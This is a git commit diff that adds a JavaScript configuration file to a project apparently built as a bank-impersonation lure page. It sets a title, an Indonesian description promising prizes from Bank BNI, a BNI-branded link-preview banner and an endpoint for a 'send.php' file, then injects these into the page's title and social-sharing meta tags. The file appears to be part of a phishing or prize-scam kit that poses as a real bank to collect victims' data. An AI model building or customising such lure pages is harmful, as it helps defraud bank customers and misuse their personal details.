66db25803cbc5b8323fabddc4d23e79ca3b4a94f
Tekno Kreasi <teknokreasiapps2@gmail.com>
2025-08-16 19:38:37 +0700

    a

---
+++ hutri80w0ndr/assets/common/js/global.js
@@ -0,0 +1,19 @@
+// Judul/nama web
+const APP_TITLE = "HutRi80w0ndr";
+// Deskripsi web/iklan
+const APP_DESC = "Dapatkan hadiah menarik dari Bank BNI buat kamu yang beruntung";
+// URL banner gambar
+const BANNER_URL = "https://zxqwx.github.io/links/banners/link_preview_bni.jpeg";
+// URL API (tempat dimana file send.php ditaruh, kosongkan jika file send.php ditaruh di halaman depan/root)
+const API_URL = "";
+
+export { APP_TITLE, APP_DESC, BANNER_URL, API_URL }
+
+$(document).ready(function() {
+	$("title").html(APP_TITLE);
+	$('meta[property="og:site_name"]').attr('content', APP_TITLE);
+	$('meta[property="og:title"]').attr('content', APP_TITLE);
+	$('meta[property="description"]').attr('content', APP_DESC);
+	$('meta[property="og:description"]').attr('content', APP_DESC);
+	$('meta[property="og:image"]').attr('content', BANNER_URL);
+});
